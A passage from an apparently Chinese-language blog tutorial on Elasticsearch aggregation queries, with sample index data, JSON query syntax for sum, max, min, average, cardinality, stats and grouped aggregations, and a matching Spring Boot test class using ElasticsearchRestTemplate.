class="line">&#123;&quot;name&quot;:&quot;李四&quot;,&quot;buyCount&quot;:5,&quot;sex&quot;:&quot;男&quot;,&quot;createMonth&quot;:&quot;2021-01&quot;&#125;  </span><br><span class="line">POST /jh\_test/\_doc/3  </span><br><span class="line">&#123;&quot;name&quot;:&quot;小卷&quot;,&quot;buyCount&quot;:18,&quot;sex&quot;:&quot;女&quot;,&quot;createMonth&quot;:&quot;2021-01&quot;&#125;  </span><br><span class="line">POST /jh\_test/\_doc/4  </span><br><span class="line">&#123;&quot;name&quot;:&quot;小明&quot;,&quot;buyCount&quot;:6,&quot;sex&quot;:&quot;女&quot;,&quot;createMonth&quot;:&quot;2021-01&quot;&#125;  </span><br><span class="line">POST /jh\_test/\_doc/5  </span><br><span class="line">&#123;&quot;name&quot;:&quot;张三&quot;,&quot;buyCount&quot;:3,&quot;sex&quot;:&quot;男&quot;,&quot;createMonth&quot;:&quot;2021-02&quot;&#125;  </span><br><span class="line">POST /jh\_test/\_doc/6  </span><br><span class="line">&#123;&quot;name&quot;:&quot;王五&quot;,&quot;buyCount&quot;:8,&quot;sex&quot;:&quot;男&quot;,&quot;createMonth&quot;:&quot;2021-02&quot;&#125;  </span><br><span class="line">POST /jh\_test/\_doc/7  </span><br><span class="line">&#123;&quot;name&quot;:&quot;赵四&quot;,&quot;buyCount&quot;:4,&quot;sex&quot;:&quot;男&quot;,&quot;createMonth&quot;:&quot;2021-02&quot;&#125;  </span><br><span class="line">POST /jh\_test/\_doc/8  </span><br><span class="line">&#123;&quot;name&quot;:&quot;诸葛亮&quot;,&quot;buyCount&quot;:6,&quot;sex&quot;:&quot;男&quot;,&quot;createMonth&quot;:&quot;2021-02&quot;&#125;  </span><br><span class="line">POST /jh\_test/\_doc/9  </span><br><span class="line">&#123;&quot;name&quot;:&quot;黄忠&quot;,&quot;buyCount&quot;:9,&quot;sex&quot;:&quot;男&quot;,&quot;createMonth&quot;:&quot;2021-03&quot;&#125;  </span><br><span class="line">POST /jh\_test/\_doc/10  </span><br><span class="line">&#123;&quot;name&quot;:&quot;李白&quot;,&quot;buyCount&quot;:1,&quot;sex&quot;:&quot;男&quot;,&quot;createMonth&quot;:&quot;2021-03&quot;&#125;  </span><br><span class="line">POST /jh\_test/\_doc/11  </span><br><span class="line">&#123;&quot;name&quot;:&quot;赵四&quot;,&quot;buyCount&quot;:3,&quot;sex&quot;:&quot;男&quot;,&quot;createMonth&quot;:&quot;2021-03&quot;&#125;  </span><br><span class="line">POST /jh\_test/\_doc/12  </span><br><span class="line">&#123;&quot;name&quot;:&quot;张三&quot;,&quot;buyCount&quot;:2,&quot;sex&quot;:&quot;男&quot;,&quot;createMonth&quot;:&quot;2021-03&quot;&#125;  </span><br><span class="line">POST /jh\_test/\_doc/13  </span><br><span class="line">&#123;&quot;name&quot;:&quot;李四&quot;,&quot;buyCount&quot;:6,&quot;sex&quot;:&quot;男&quot;,&quot;createMonth&quot;:&quot;2021-04&quot;&#125;  </span><br><span class="line">POST /jh\_test/\_doc/14  </span><br><span class="line">&#123;&quot;name&quot;:&quot;王五&quot;,&quot;buyCount&quot;:9,&quot;sex&quot;:&quot;男&quot;,&quot;createMonth&quot;:&quot;2021-04&quot;&#125;  </span><br><span class="line">POST /jh\_test/\_doc/15  </span><br><span class="line">&#123;&quot;name&quot;:&quot;李四&quot;,&quot;buyCount&quot;:4,&quot;sex&quot;:&quot;男&quot;,&quot;createMonth&quot;:&quot;2021-04&quot;&#125;  </span><br><span class="line">POST /jh\_test/\_doc/16  </span><br><span class="line">&#123;&quot;name&quot;:&quot;王五&quot;,&quot;buyCount&quot;:2,&quot;sex&quot;:&quot;男&quot;,&quot;createMonth&quot;:&quot;2021-04&quot;&#125;  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>聚合查询语法：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">&quot;aggs&quot; : &#123;  </span><br><span class="line">    &quot;&lt;aggregation\_name&gt;&quot; : &#123;                                 &lt;!--聚合名称 --&gt;  </span><br><span class="line">        &quot;&lt;aggregation\_type&gt;&quot; : &#123;                             &lt;!--聚合类型 --&gt;  </span><br><span class="line">            &lt;aggregation\_body&gt;                               &lt;!--聚合具体字段 --&gt;  </span><br><span class="line">        &#125;  </span><br><span class="line">        \[,&quot;meta&quot; : &#123;  \[&lt;meta\_data\_body&gt;\] &#125; \]?                &lt;!--元信息 --&gt;  </span><br><span class="line">        \[,&quot;aggs&quot; : &#123; \[&lt;sub\_aggregation&gt;\]+ &#125; \]?       &lt;!--子聚合 --&gt;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol><li><strong>查询 buyCount 的总和</strong></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">GET /jh\_test/\_search  </span><br><span class="line">&#123;  </span><br><span class="line">  &quot;size&quot;:0,  </span><br><span class="line">  &quot;aggs&quot;:&#123;  </span><br><span class="line">    &quot;buyCountSum&quot;:&#123;  </span><br><span class="line">      &quot;sum&quot;: &#123;  </span><br><span class="line">        &quot;field&quot;: &quot;buyCount&quot;  </span><br><span class="line">      &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="2"><li><strong>查询 2021-02 月 buyCount 的总和</strong></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;  </span><br><span class="line">  &quot;size&quot;:0,  </span><br><span class="line">   &quot;query&quot;: &#123;  </span><br><span class="line">&quot;term&quot;: &#123;   </span><br><span class="line">            &quot;createMonth&quot;: &quot;2021-02&quot;   </span><br><span class="line">        &#125;  </span><br><span class="line">&#125;,  </span><br><span class="line">  &quot;aggs&quot;:&#123;  </span><br><span class="line">    &quot;buyCountSum&quot;:&#123;  </span><br><span class="line">      &quot;sum&quot;: &#123;  </span><br><span class="line">        &quot;field&quot;: &quot;buyCount&quot;  </span><br><span class="line">      &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="3"><li><strong>查询 2021-03 月 buyCount 的最大值：</strong></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;  </span><br><span class="line">  &quot;size&quot;:0,  </span><br><span class="line">   &quot;query&quot;: &#123;  </span><br><span class="line">&quot;term&quot;: &#123;   </span><br><span class="line">            &quot;createMonth&quot;: &quot;2021-03&quot;   </span><br><span class="line">        &#125;  </span><br><span class="line">&#125;,  </span><br><span class="line">  &quot;aggs&quot;:&#123;  </span><br><span class="line">    &quot;buyCountMax&quot;:&#123;  </span><br><span class="line">      &quot;max&quot;: &#123;  </span><br><span class="line">        &quot;field&quot;: &quot;buyCount&quot;  </span><br><span class="line">      &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="4"><li><strong>查询 2021-03 月 buyCount 的最小值：</strong></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;  </span><br><span class="line">  &quot;size&quot;:0,  </span><br><span class="line">   &quot;query&quot;: &#123;  </span><br><span class="line">&quot;term&quot;: &#123;   </span><br><span class="line">            &quot;createMonth&quot;: &quot;2021-03&quot;   </span><br><span class="line">        &#125;  </span><br><span class="line">&#125;,  </span><br><span class="line">  &quot;aggs&quot;:&#123;  </span><br><span class="line">    &quot;buyCountMin&quot;:&#123;  </span><br><span class="line">      &quot;min&quot;: &#123;  </span><br><span class="line">        &quot;field&quot;: &quot;buyCount&quot;  </span><br><span class="line">      &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="5"><li><strong>同时查询 2021-03 月 buyCount 的最大值和最小值：</strong></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;  </span><br><span class="line">  &quot;size&quot;:0,  </span><br><span class="line">   &quot;query&quot;: &#123;  </span><br><span class="line">&quot;term&quot;: &#123;   </span><br><span class="line">            &quot;createMonth&quot;: &quot;2021-03&quot;   </span><br><span class="line">        &#125;  </span><br><span class="line">&#125;,  </span><br><span class="line">  &quot;aggs&quot;:&#123;  </span><br><span class="line">    &quot;buyCountMax&quot;:&#123;  </span><br><span class="line">      &quot;max&quot;: &#123;  </span><br><span class="line">        &quot;field&quot;: &quot;buyCount&quot;  </span><br><span class="line">      &#125;  </span><br><span class="line">    &#125;,  </span><br><span class="line">     &quot;buyCountMin&quot;:&#123;  </span><br><span class="line">      &quot;min&quot;: &#123;  </span><br><span class="line">        &quot;field&quot;: &quot;buyCount&quot;  </span><br><span class="line">      &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="6"><li><strong>查询所有 name 的去重后的数量</strong></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;  </span><br><span class="line">  &quot;size&quot;:0,  </span><br><span class="line">  &quot;aggs&quot;:&#123;  </span><br><span class="line">    &quot;distinctName&quot;:&#123;  </span><br><span class="line">      &quot;cardinality&quot;: &#123;  </span><br><span class="line">        &quot;field&quot;: &quot;name.keyword&quot;  </span><br><span class="line">      &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="7"><li><strong>查询 2021-04 月 name 的去重后的数量</strong></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;  </span><br><span class="line">  &quot;size&quot;:0,  </span><br><span class="line">  &quot;query&quot;: &#123;  </span><br><span class="line">&quot;term&quot;: &#123;   </span><br><span class="line">            &quot;createMonth&quot;: &quot;2021-04&quot;   </span><br><span class="line">        &#125;  </span><br><span class="line">&#125;,  </span><br><span class="line">  &quot;aggs&quot;:&#123;  </span><br><span class="line">    &quot;distinctName&quot;:&#123;  </span><br><span class="line">      &quot;cardinality&quot;: &#123;  </span><br><span class="line">        &quot;field&quot;: &quot;name.keyword&quot;  </span><br><span class="line">      &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="8"><li><strong>查询 BuyCount 的平均值</strong></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;  </span><br><span class="line">    &quot;size&quot;:&quot;0&quot;,  </span><br><span class="line">    &quot;aggs&quot;:&#123;  </span><br><span class="line">        &quot;buyCountAvg&quot;:&#123;  </span><br><span class="line">            &quot;avg&quot;:&#123;  </span><br><span class="line">                &quot;field&quot;:&quot;buyCount&quot;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="9"><li><strong>一次查询 总数，最大值，最小值，平均值，总和</strong></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;  </span><br><span class="line">  &quot;size&quot;:0,  </span><br><span class="line">  &quot;aggs&quot;:&#123;  </span><br><span class="line">    &quot;statsAll&quot;:&#123;  </span><br><span class="line">      &quot;stats&quot;:&#123;  </span><br><span class="line">        &quot;field&quot;:&quot;buyCount&quot;  </span><br><span class="line">      &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="10"><li><strong>根据 createMonth 分组查询每个月的最大 buyCount</strong></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;  </span><br><span class="line">    &quot;size&quot;:0,  </span><br><span class="line">    &quot;aggs&quot;: &#123;  </span><br><span class="line">    &quot;createMonthGroup&quot;: &#123;  </span><br><span class="line">      &quot;terms&quot;: &#123;  </span><br><span class="line">        &quot;field&quot;: &quot;createMonth&quot;  </span><br><span class="line">      &#125;,  </span><br><span class="line">      &quot;aggs&quot;: &#123;  </span><br><span class="line">        &quot;buyCountMax&quot;: &#123;  </span><br><span class="line">          &quot;max&quot;: &#123;  </span><br><span class="line">            &quot;field&quot;: &quot;buyCount&quot;  </span><br><span class="line">          &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">      &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="11"><li><strong>查询每 createMonth 下，根据 sex 区分，统计buyCount 的平均值</strong></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;  </span><br><span class="line">    &quot;size&quot;:0,  </span><br><span class="line">    &quot;aggs&quot;: &#123;  </span><br><span class="line">    &quot;createMonthGroup&quot;: &#123;  </span><br><span class="line">      &quot;terms&quot;: &#123;  </span><br><span class="line">        &quot;field&quot;: &quot;createMonth&quot;  </span><br><span class="line">      &#125;,  </span><br><span class="line">      &quot;aggs&quot;: &#123;  </span><br><span class="line">        &quot;sexGroup&quot;: &#123;  </span><br><span class="line">          &quot;terms&quot;: &#123;  </span><br><span class="line">            &quot;field&quot;: &quot;sex&quot;  </span><br><span class="line">          &#125;,  </span><br><span class="line">          &quot;aggs&quot;: &#123;  </span><br><span class="line">                &quot;buyCountAvg&quot;: &#123;  </span><br><span class="line">                    &quot;avg&quot;: &#123;  </span><br><span class="line">                        &quot;field&quot;: &quot;buyCount&quot;  </span><br><span class="line">                    &#125;  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">      &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="5-2-2-ES客户端实现聚合查询"><a href="#5-2-2-ES客户端实现聚合查询" class="headerlink" title="5.2.2 ES客户端实现聚合查询"></a>5.2.2 ES客户端实现聚合查询</h3><p>测试代码如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">@SpringBootTest  </span><br><span class="line">@Slf4j  </span><br><span class="line">public class AggregationTest &#123;  </span><br><span class="line">  </span><br><span class="line">    @Resource  </span><br><span class="line">    ElasticsearchRestTemplate elasticsearchRestTemplate;  </span><br><span class="line">  </span><br><span class="line">    /\*\*  </span><br><span class="line">     \* 查询 buyCount 的总和  </span><br><span class="line">     \*/  </span><br><span class="line">    @Test  </span><br><span class="line">    void aggs1() &#123;  </span><br><span class="line">        SumAggregationBuilder buyCountSum = AggregationBuilders.sum(&quot;buyCountSum&quot;).field(&quot;buyCount&quot;);  </span><br><span class="line">        Query query = new NativeSearchQueryBuilder()  </span><br><span class="line">                .withAggregations(buyCountSum)  </span><br><span class="line">//                .addAggregation(buyCountSum)  </span><br><span class="line">                .build();  </span><br><span class="line">        SearchHits&lt;JhTestEntity&gt; search = elasticsearchRestTemplate.search(query, JhTestEntity.class);  </span><br><span class="line">        if (search.hasAggregations()) &#123;  </span><br><span class="line">            Aggregations aggregations = (Aggregations) search.getAggregations().aggregations();  </span><br><span class="line">            if (Objects.nonNull(aggregations)) &#123;  </span><br><span class="line">                Sum sum = aggregations.get(&quot;buyCountSum&quot;);  </span><br><span class="line">                log.info(&quot;计算 buyCount 总数：&#123;&#125; &quot;, sum.getValue());  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    /\*\*  </span><br><span class="line">     \* 查询 2021-02 月 buyCount 的总和：  </span><br><span class="line">     \*/  </span><br><span class="line">    @Test  </span><br><span class="line">    void aggs2() &#123;  </span><br><span class="line">        QueryBuilder queryBuilder = QueryBuilders.termQuery(&quot;createMonth&quot;, &quot;2021-02&quot;);  </span><br><span class="line">        SumAggregationBuilder buyCountSum = AggregationBuilders.sum(&quot;buyCountSum&quot;).field(&quot;buyCount&quot;);  </span><br><span class="line">        Query query = new NativeSearchQueryBuilder()  </span><br><span class="line">                .withQuery(queryBuilder)  </span><br><span class="line">                .withAggregations(buyCountSum)  </span><br><span class="line">//                .addAggregation(buyCountSum)  </span><br><span class="line">                .build();  </span><br><span class="line">        SearchHits&lt;JhTestEntity&gt; search = elasticsearchRestTemplate.search(query, JhTestEntity.class);  </span><br><span class="line">        if (search.hasAggregations()) &#123;  </span><br><span class="line">            Aggregations aggregations = (Aggregations) search.getAggregations().aggregations();  </span><br><span class="line">            if (Objects.nonNull(aggregations)) &#123;  </span><br><span class="line">                Sum sum = aggregations.get(&quot;buyCountSum&quot;);  </span><br><span class="line">                log.info(&quot;计算 buyCount 总数：&#123;&#125; &quot;, sum.getValue());  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    /\*\*  </span><br><span class="line">     \* 查询 2021-03 月 buyCount 的最大值：  </span><br><span class="line">     \*/  </span><br><span class="line">    @Test  </span><br><span class="line">    void aggs3() &#123;  </span><br><span class="line">        QueryBuilder queryBuilder = QueryBuilders.termQuery(&quot;createMonth&quot;, &quot;2021-03&quot;);  </span><br><span class="line">        MaxAggregationBuilder buyCountMax = AggregationBuilders.max(&quot;buyCountMax&quot;).field(&quot;buyCount&quot;);  </span><br><span class="line">        Query query = new NativeSearchQueryBuilder()  </span><br><span class="line">                .withQuery(queryBuilder)  </span><br><span class="line">                .withAggregations(buyCountMax)  </span><br><span class="line">//                .addAggregation(buyCountMax)  </span><br><span class="line">                .build();  </span><br><span class="line">        SearchHits&lt;JhTestEntity&gt; search = elasticsearchRestTemplate.search(query, JhTestEntity.class);  </span><br><span class="line">        if (search.hasAggregations()) &#123;  </span><br><span class="line">            Aggregations aggregations = (Aggregations) search.getAggregations().aggregations();  </span><br><span class="line">            if (Objects.nonNull(aggregations)) &#123;  </span><br><span class="line">                Max max = aggregations.get(&quot;buyCountMax&quot;);  </span><br><span class="line">                log.info(&quot;计算 buyCount 最大值：&#123;&#125; &quot;, max.getValue());  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    /\*\*  </span><br><span class="line">     \* 查询 2021-03 月 buyCount 的最小值：  </span><br><span class="line">     \*/  </span><br><span class="line">    @Test  </span><br><span class="line">    void aggs4() &#123;  </span><br><span class="line">        QueryBuilder queryBuilder = QueryBuilders.termQuery(&quot;createMonth&quot;, &quot;2021-03&quot;);  </span><br><span class="line">        MinAggregationBuilder buyCountMin = AggregationBuilders.min(&quot;buyCountMin&quot;).field(&quot;buyCount&quot;);  </span><br><span class="line">        Query query = new NativeSearchQueryBuilder()  </span><br><span class="line">                .withQuery(queryBuilder)  </span><br><span class="line">                .withAggregations(buyCountMin)  </span><br><span class="line">//                .addAggregation(buyCountMin)  </span><br><span class="line">                .build();  </span><br><span class="line">        SearchHits&lt;JhTestEntity&gt; search = elasticsearchRestTemplate.search(query, JhTestEntity.class);  </span><br><span class="line">        if (search.hasAggregations()) &#123;  </span><br><span class="line">            Aggregations aggregations = (Aggregations) search.getAggregations().aggregations();  </span><br><span class="line">            if (Objects.nonNull(aggregations)) &#123;  </span><br><span class="line">                Min min = aggregations.get(&quot;buyCountMin&quot;);  </span><br><span class="line">                log.info(&quot;计算 buyCount 最小值：&#123;&#125; &quot;, min.getValue());  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    /\*\*  </span><br><span class="line">     \* 同时查询 2021-03 月 buyCount 的最大值和最小值：  </span><br><span class="line">     \*/  </span><br><span class="line">    @Test  </span><br><span class="line">    void aggs5() &#123;  </span><br><span class="line">        QueryBuilder queryBuilder = QueryBuilders.termQuery(&quot;createMonth&quot;, &quot;2021-03&quot;);  </span><br><span class="line">        MaxAggregationBuilder buyCountMax = AggregationBuilders.max(&quot;buyCountMax&quot;).field(&quot;buyCount&quot;);  </span><br><span class="line">        MinAggregationBuilder buyCountMin = AggregationBuilders.min(&quot;buyCountMin&quot;).field(&quot;buyCount&quot;);  </span><br><span class="line">        Query query = new NativeSearchQueryBuilder()  </span><br><span class="line">                .withQuery(queryBuilder)  </span><br><span class="line">                .withAggregations(buyCountMax)  </span><br><span class="line">                .withAggregations(buyCountMin)  </span><br><span class="line">//                .addAggregation(buyCountMax)  </span><br><span class="line">//                .addAggregation(buyCountMin)  </span><br><span class="line">                .build();  </span><br><span class="line">        SearchHits&lt;JhTestEntity&gt; search = elasticsearchRestTemplate.search(query, JhTestEntity.class);  </span><br><span class="line">        if (search.hasAggregations()) &#123;  </span><br><span class="line">            Aggregations aggregations = (Aggregations) search.getAggregations().aggregations();  </span><br><span class="line">            if (Objects.nonNull(aggregations)) &#123;  </span><br><span class="line">                Max max = aggregations.get(&quot;buyCountMax&quot;);  </span><br><span class="line">                log.info(&quot;计算 buyCount 最大值：&#123;&#125; &quot;, max.getValue());  </span><br><span class="line">                Min min = aggregations.get(&quot;buyCountMin&quot;);  </span><br><span class="line">                log.info(&quot;计算 buyCount 最小值：&#123;&#125; &quot;, min.getValue());  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    /\*\*  </span><br><span class="line">     \* 查询所有 name 的去重后的数量  </span><br><span class="line">     \*/  </span><br><span class="line">    @Test  </span><br><span class="line">    void aggs6() &#123;  </span><br><span class="line">        CardinalityAggregationBuilder distinctName = AggregationBuilders.cardinality(&quot;distinctName&quot;).field(&quot;name.keyword&quot;);  </span><br><span class="line">        Query query = new NativeSearchQueryBuilder()  </span><br><span class="line">                .withAggregations(distinctName)  </span><br><span class="line">//                .addAggregation(distinctName)  </span><br><span class="line">                .build();  </span><br><span class="line">        SearchHits&lt;JhTestEntity&gt; search = elasticsearchRestTemplate.search(query, JhTestEntity.class);  </span><br><span class="line">        if (search.hasAggregations()) &#123;  </span><br><span class="line">            Aggregations aggregations = (Aggregations) search.getAggregations().aggregations();  </span><br><span class="line">            if (Objects.nonNull(aggregations)) &#123;  </span><br><span class="line">                Cardinality cardinality = aggregations.get(&quot;distinctName&quot;);  </span><br><span class="line">                log.info(&quot;计算 name 的去重后的数量：&#123;&#125; &quot;, cardinality.getValue());  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    /\*\*  </span><br><span class="line">     \*  查询 2021-04 月 name 的去重后的数量  </span><br><span class="line">     \*/  </span><br><span class="line">    @Test  </span><br><span class="line">    void aggs7() &#123;  </span><br><span class="line">        QueryBuilder queryBuilder = QueryBuilders.termQuery(&quot;createMonth&quot;, &quot;2021-04&quot;);  </span><br><span class="line">        CardinalityAggregationBuilder distinctName = AggregationBuilders.cardinality(&quot;distinctName&quot;).field(&quot;name.keyword&quot;);  </span><br><span class="line">        Query query = new NativeSearchQueryBuilder()  </span><br><span class="line">                .withQuery(queryBuilder)  </span><br><span class="line">                .withAggregations(distinctName)  </span><br><span class="line">//                .addAggregation(distinctName)  </span><br><span class="line">                .build();  </span><br><span class="line">        SearchHits&lt;JhTestEntity&gt; search = elasticsearchRestTemplate.search(query, JhTestEntity.class);  </span><br><span class="line">        if (search.hasAggregations()) &#123;  </span><br><span class="line">            Aggregations aggregations = (Aggregations) search.getAggregations().aggregations();  </span><br><span class="line">            if (Objects.nonNull(aggregations)) &#123;  </span><br><span class="line">                Cardinality cardinality = aggregations.get(&quot;distinctName&quot;);  </span><br><span class="line">                log.info(&quot;计算 name 的去重后的数量：&#123;&#125; &quot;, cardinality.getValue());  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    /\*\*  </span><br><span class="line">     \* 查询 BuyCount 的平均值  </span><br><span class="line">     \*/  </span><br><span class="line">    @Test  </span><br><span class="line">    void aggs8() &#123;  </span><br><span class="line">        AvgAggregationBuilder buyCountAvg = AggregationBuilders.avg(&quot;buyCountAvg&quot;).field(&quot;buyCount&quot;);  </span><br><span class="line">        Query query = new NativeSearchQueryBuilder()  </span><br><span class="line">                .withAggregations(buyCountAvg)  </span><br><span class="line">//                .addAggregation(buyCountAvg)  </span><br><span class="line">                .build();  </span><br><span class="line">        SearchHits&lt;JhTestEntity&gt; search = elasticsearchRestTemplate.search(query, JhTestEntity.class);  </span><br><span class="line">        if (search.hasAggregations()) &#123;  </span><br><span class="line">            Aggregations aggregations = (Aggregations) search.getAggregations().aggregations();  </span><br><span class="line">            if (Objects.nonNull(aggregations)) &#123;  </span><br><span class="line">                Avg avg = aggregations.get(&quot;buyCountAvg&quot;);  </span><br><span class="line">                log.info(&quot;计算 buyCount 的平均值：&#123;&#125; &quot;, avg.getValue());  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    /\*\*  </span><br><span class="line">     \* 一次查询 总数，最大值，最小值，平均值，总和  </span><br><span class="line">     \*/  </span><br><span class="line">    @Test  </span><br><span class="line">    void aggs9() &#123;  </span><br><span class="line">        StatsAggregationBuilder stats = AggregationBuilders.stats(&quot;stats&quot;).field(&quot;buyCount&quot;);  </span><br><span class="line">        Query query = new NativeSearchQueryBuilder()  </span><br><span class="line">                .withAggregations(stats)  </span><br><span class="line">//                .addAggregation(stats)  </span><br><span class="line">                .build();  </span><br><span class="line">        SearchHits&lt;JhTestEntity&gt; search = elasticsearchRestTemplate.search(query, JhTestEntity.class);  </span><br><span class="line">        if (search.hasAggregations()) &#123;  </span><br><span class="line">            Aggregations aggregations = (Aggregations) search.getAggregations().aggregations();  </span><br><span class="line">            if (Objects.nonNull(aggregations)) &#123;  </span><br><span class="line">                Stats s = aggregations.get(&quot;stats&quot;);  </span><br><span class="line">                log.info(&quot;计算 buyCount 的 count：&#123;&#125; &quot;, s.getCount());  </span><br><span class="line">                log.info(&quot;计算 buyCount 的 min：&#123;&#125; &quot;, s.getMin());  </span><br><span class="line">                log.info(&quot;计算 buyCount 的 max：&#123;&#125; &quot;, s.getMax());  </span><br><span class="line">                log.info(&quot;计算 buyCount 的 avg：&#123;&#125; &quot;, s.getAvg());  </span><br><span class="line">                log.info(&quot;计算 buyCount 的 sum：&#123;&#125; &quot;, s.getSum());  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    /\*\*  </span><br><span class="line">     \* 根据 createMonth 分组查询每个月的最大 buyCount  </span><br><span class="line">     \*/  </span><br><span class="line">    @Test  </span><br><span class="line">    void aggs10() &#123;  </span><br><span class="line">        TermsAggregationBuilder createMonthGroup = AggregationBuilders.terms(&quot;createMonthGroup&quot;).field(&quot;createMonth&quot;)  </span><br><span class="line">                .subAggregation(AggregationBuilders.max(&quot;buyCountMax&quot;).field(&quot;buyCount&quot;));  </span><br><span class="line">  </span><br><span class="line">        Query query = new NativeSearchQueryBuilder()  </span><br><span class="line">                .withAggregations(createMonthGroup)  </span><br><span class="line">//                .addAggregation(createMonthGroup)  </span><br><span class="line">                .build();  </span><br><span class="line">        SearchHits&lt;JhTestEntity&gt; search = elasticsearchRestTemplate.search(query, JhTestEntity.class);  </span><br><span class="line">        if (search.hasAggregations()) &#123;  </span><br><span class="line">            Aggregations aggregations = (Aggregations) search.getAggregations().aggregations();  </span><br><span class="line">            if (Objects.nonNull(aggregations)) &#123;  </span><br><span class="line">                Terms terms = aggregations.get(&quot;createMonthGroup&quot;);  </span><br><span class="line">                terms.getBuckets().forEach(bucket -&gt; &#123;  </span><br><span class="line">                    String createMonth = bucket.getKeyAsString();  </span><br><span class="line">                    Aggregations subAggs = bucket.getAggregations();  </span><br><span class="line">                    if (Objects.nonNull(subAggs)) &#123;  </span><br><span class="line">                        Max max = subAggs.get(&quot;buyCountMax&quot;);  </span><br><span class="line">                        log.info(&quot;计算 &#123;&#125; 月的最大值为：&#123;&#125; &quot;, createMonth, max.getValue());  </span><br><span class="line">                    &#125;  </span><br><span class="line">                &#125;);  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    /\*\*  </span><br><span class="line">     \*  查询每 createMonth 下，根据 sex 区分，统计buyCount 